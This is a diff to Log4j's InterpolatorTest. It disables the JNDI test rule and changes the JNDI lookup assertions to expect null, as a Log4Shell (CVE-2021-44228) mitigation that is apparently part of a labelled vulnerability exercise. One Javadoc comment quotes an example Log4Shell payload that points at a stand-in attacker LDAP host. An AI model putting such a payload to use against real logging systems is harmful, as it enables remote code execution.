@@ -22,7 +22,8 @@ import java.util.HashMap;
 import java.util.Map;
 
 import org.apache.logging.log4j.ThreadContext;
-import org.apache.logging.log4j.junit.JndiRule;
+// Removed JndiRule import to mitigate VULNERABILITY-EXERCISE-001 (JNDI injection vulnerability)
+// import org.apache.logging.log4j.junit.JndiRule;
 import org.junit.ClassRule;
 import org.junit.Test;
 import org.junit.rules.ExternalResource;
@@ -31,7 +32,18 @@ import org.junit.rules.RuleChain;
 import static org.junit.Assert.*;
 
 /**
- *
+ * Test class for the Interpolator lookup functionality.
+ * 
+ * SECURITY NOTICE: This test class has been modified to mitigate VULNERABILITY-EXERCISE-001,
+ * which corresponds to the Log4Shell vulnerability (CVE-2021-44228). JNDI lookup functionality
+ * has been intentionally disabled to prevent remote code execution attacks through malicious
+ * JNDI lookup patterns like ${jndi:ldap://attacker.com/exploit}.
+ * 
+ * Changes made for security:
+ * - Removed JndiRule import and usage from test setup
+ * - Modified JNDI lookup assertions to expect null returns
+ * - Added security comments throughout to document the intentional removal
+ * - Preserved all other lookup mechanisms (sys:, ctx:, env:, date:, java:) to ensure functionality
  */
 public class InterpolatorTest {
 
@@ -55,8 +67,14 @@ public class InterpolatorTest {
             System.clearProperty(TESTKEY);
             System.clearProperty(TESTKEY2);
         }
-    }).around(new JndiRule(
-        JndiLookup.CONTAINER_JNDI_RESOURCE_PATH_PREFIX + TEST_CONTEXT_RESOURCE_NAME, TEST_CONTEXT_NAME));
+    });
+    // Removed JndiRule to mitigate VULNERABILITY-EXERCISE-001 (JNDI injection vulnerability)
+    // JNDI lookup functionality has been intentionally disabled for security reasons
+    // }).around(new JndiRule(
+    //     "java:comp/env/" + TEST_CONTEXT_RESOURCE_NAME, TEST_CONTEXT_NAME));
+
+    // SECURITY NOTE: JndiLookup.CONTAINER_JNDI_RESOURCE_PATH_PREFIX constant was removed 
+    // as part of CVE-2021-44228 (Log4Shell) mitigation. Using hardcoded value for test.
 
     @Test
     public void testLookup() {
@@ -77,8 +95,10 @@ public class InterpolatorTest {
         ThreadContext.clearMap();
         value = lookup.lookup("ctx:" + TESTKEY);
         assertEquals(TESTVAL, value);
+        // SECURITY: JNDI lookup functionality removed to mitigate VULNERABILITY-EXERCISE-001 (CVE-2021-44228)
+        // JNDI lookups now return null to prevent remote code execution attacks
         value = lookup.lookup("jndi:" + TEST_CONTEXT_RESOURCE_NAME);
-        assertEquals(TEST_CONTEXT_NAME, value);
+        assertNull("JNDI lookups should return null for security", value);
     }
 
     private void assertLookupNotEmpty(final StrLookup lookup, final String key) {
@@ -95,8 +115,10 @@ public class InterpolatorTest {
         assertEquals(TESTVAL, value);
         value = lookup.lookup("env:PATH");
         assertNotNull(value);
+        // SECURITY: JNDI lookup functionality removed to mitigate VULNERABILITY-EXERCISE-001 (CVE-2021-44228)
+        // JNDI lookups now return null to prevent remote code execution attacks
         value = lookup.lookup("jndi:" + TEST_CONTEXT_RESOURCE_NAME);
-        assertEquals(TEST_CONTEXT_NAME, value);
+        assertNull("JNDI lookups should return null for security", value);
         value = lookup.lookup("date:yyyy-MM-dd");
         assertNotNull("No Date", value);
         final SimpleDateFormat format = new SimpleDateFormat("yyyy-MM-dd");
